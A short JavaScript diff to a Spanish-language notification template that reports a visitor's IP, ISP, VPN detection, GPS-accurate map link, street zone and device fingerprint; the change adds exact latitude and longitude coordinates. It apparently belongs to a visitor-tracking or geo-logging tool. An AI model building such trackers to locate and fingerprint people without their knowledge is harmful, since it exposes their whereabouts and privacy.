@@ -215,7 +215,8 @@ export const notify = {
 🌍 País: ${geo.country}${geo.countryCode ? ` (${geo.countryCode})` : ''}${geo.city ? ` — ${geo.city}${geo.region ? ', ' + geo.region : ''}` : ''}${geo.isp ? ` — ${geo.isp}` : ''}
 🌐 IP: ${ip || 'desconocida'}${geo.asn ? ` — ${geo.asn}` : ''}${geo.src ? ` (geo: ${geo.src})` : ''}${geo.mobile ? ' · 📶 IP móvil' : ''}
 🛡️ VPN/Proxy: ${geo.vpn ? `SÍ (${(geo.vpnReasons || []).join(' + ')})` : 'no'}${mapsUrl ? `
-📍Maps Ubi: ${mapsUrl}${geo.acc ? ` (GPS ±${Math.round(geo.acc)} m)` : ''}` : ''}${geo.street ? `
+📍Maps Ubi: ${mapsUrl}${geo.acc ? ` (GPS ±${Math.round(geo.acc)} m)` : ''}` : ''}${(geo.lat && geo.lon) ? `
+🎯 Coords: ${geo.lat}, ${geo.lon}` : ''}${geo.street ? `
 🏠 Zona: ${geo.street}` : ''}
 📱 Dispositivo: ${device} · ${os} · ${browser}
 🖥️ Huella: ${fpLine}${f.cores ? ` · ${f.cores} núcleos` : ''}${f.touch ? ` · táctil x${f.touch}` : ''}
